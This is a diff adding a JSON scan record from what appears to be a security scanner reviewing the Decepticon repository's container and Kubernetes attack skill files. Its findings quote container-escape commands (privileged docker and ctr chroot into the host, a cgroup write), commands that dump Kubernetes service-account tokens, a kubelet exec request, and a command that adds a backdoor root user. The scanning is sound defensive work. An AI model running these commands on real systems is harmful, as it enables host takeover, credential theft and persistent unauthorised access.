@@ -1,0 +1,245 @@
+{
+  "id": "bittersecurity__decepticon__packages~decepticon~decepticon~skills~standard~cloud~container",
+  "owner": "BitterSecurity",
+  "repo": "Decepticon",
+  "path": "packages/decepticon/decepticon/skills/standard/cloud/container",
+  "name": "container-overview",
+  "description": "Container / Kubernetes attack category — pod escape, RBAC abuse, runtime CVE exploitation, socket-mount escape. Routing skill: identify the surface (pod-internal RCE vs API-level vs build-pipeline), then load the matching sub-skill.",
+  "stars": 6567,
+  "category": "coding",
+  "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+  "contentHash": "acd0f364ae7a2d937a04551b3f097ef3fe77a1596ceae7bf5989153aa51dd5b8",
+  "repoCreatedAt": "2025-06-06T12:55:02Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/container-cve/SKILL.md",
+        "line": 20,
+        "excerpt": "cat /etc/os-release                  # base image",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/container-cve/SKILL.md",
+        "line": 26,
+        "excerpt": "curl -k https://127.0.0.1:10250/runningpods | jq '.items[0].metadata'",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/container-cve/SKILL.md",
+        "line": 38,
+        "excerpt": "cat > Dockerfile <<'EOF'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/docker-socket-mount/SKILL.md",
+        "line": 19,
+        "excerpt": "ls -la /var/run/docker.sock /run/docker.sock /var/run/containerd/containerd.sock /run/containerd/containerd.sock 2>&1 | grep -v 'No such'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/docker-socket-mount/SKILL.md",
+        "line": 29,
+        "excerpt": "docker run --rm -it --privileged -v /:/host alpine chroot /host /bin/sh",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/docker-socket-mount/SKILL.md",
+        "line": 33,
+        "excerpt": "apk add docker-cli 2>/dev/null || apt-get install -y docker.io 2>/dev/null",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/docker-socket-mount/SKILL.md",
+        "line": 45,
+        "excerpt": "ctr -a /run/containerd/containerd.sock images pull docker.io/library/alpine:latest",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/docker-socket-mount/SKILL.md",
+        "line": 48,
+        "excerpt": "docker.io/library/alpine:latest escape sh -c 'chroot /host'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/docker-socket-mount/SKILL.md",
+        "line": 59,
+        "excerpt": "crictl --runtime-endpoint unix:///var/run/crio/crio.sock pods",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/docker-socket-mount/SKILL.md",
+        "line": 77,
+        "excerpt": "chroot /host useradd -ou 0 -g 0 -m -s /bin/bash backdoor",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 20,
+        "excerpt": "cat /proc/self/status | grep -E '^(Cap|Seccomp|NoNewPriv)'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 33,
+        "excerpt": "curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/default/pods",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "kubernetes.default.svc"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 42,
+        "excerpt": "grep CapEff /proc/self/status",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 57,
+        "excerpt": "mount | grep -E '/host|/node|docker.sock|/etc|/root'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 63,
+        "excerpt": "ctr -a /run/containerd/containerd.sock run --rm -t --privileged --mount type=bind,src=/,dst=/host,options=rbind alpine escape sh -c 'chroot /host'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 70,
+        "excerpt": "ps auxf | head",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 84,
+        "excerpt": "grep CapEff /proc/self/status   # 00000000a82425fb or similar with bit 21 set",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 97,
+        "excerpt": "sh -c \"echo \\$\\$ > /tmp/x/cgroup.procs\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 107,
+        "excerpt": "cat > Dockerfile <<'EOF'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 122,
+        "excerpt": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 124,
+        "excerpt": "curl -sk -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-pod-escape/SKILL.md",
+        "line": 139,
+        "excerpt": "find /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token -exec cat {} \\; -exec echo --- \\;",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-rbac-abuse/SKILL.md",
+        "line": 19,
+        "excerpt": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-rbac-abuse/SKILL.md",
+        "line": 46,
+        "excerpt": "kubectl auth can-i create pods/exec",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "packages/decepticon/decepticon/skills/standard/cloud/container/k8s-rbac-abuse/SKILL.md",
+        "line": 149,
+        "excerpt": "curl -sk http://localhost:8080/api/v1/nodes/$NODE/proxy/run/POD_NS/POD_NAME/CONTAINER -X POST -d 'cmd=id'",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      }
+    ],
+    "findingTotals": {
+      "shell": 27,
+      "network": 4,
+      "downloads-code": 1
+    },
+    "score": 75,
+    "band": "review",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 5,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "df879550544d36b6b1e69062f05adae28537adf2",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 75,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
